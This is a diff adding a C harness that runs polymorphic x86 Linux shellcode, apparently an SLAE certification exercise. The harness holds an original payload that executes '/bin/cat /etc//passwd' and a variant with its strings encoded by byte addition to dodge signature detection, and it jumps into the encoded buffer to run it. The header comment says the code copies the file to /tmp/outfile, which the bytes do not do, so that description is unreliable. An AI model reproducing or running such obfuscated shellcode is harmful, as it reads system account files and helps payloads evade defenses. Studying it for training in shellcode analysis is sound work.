@@ -1,0 +1,34 @@
+#include<stdio.h>
+#include<string.h>
+//Author: Aaron Weathersby
+//SLAE #1488
+//Handle: t0b0x0r
+//github:https://github.com/t0b0rX0r/slae/upload/master/assignment6_task2
+//;Assignment #6-Task2- Copy /etc/passwd to /tmp/outfile
+//created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+#include<stdio.h>
+#include<string.h>
+
+unsigned char code[] = 
+"\x31\xc0\x99\x52\x05\x01\x01\x01\x01\x05\x2e\x62\x60\x73\x50\x31\xc0\x05\x01\x01\x01\x01\x05\x2e\x61\x68\x6d\x50\x31\xc0\x89\xe3\x52\x05\x01\x01\x01\x01\x05\x72\x72\x76\x63\x50\x31\xc0\x05\x01\x01\x01\x01\x05\x2e\x2e\x6f\x60\x50\x31\xc0\x68\x2f\x65\x74\x63\x89\xe1\x04\x0b\x52\x51\x53\x89\xe1\xcd\x80";
+
+
+unsigned char org[] =
+"\x31\xc0\x99\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe1\xb0\x0b\x52\x51\x53\x89\xe1\xcd\x80";
+
+
+
+main()
+{
+
+	printf("Polymorphic Shellcode Length:  %d\n", strlen(code));
+	printf("Orginal Shellcode Length:  %d\n", strlen(org));
+
+	int (*ret)() = (int(*)())code;
+
+	ret();
+
+}
+
+	
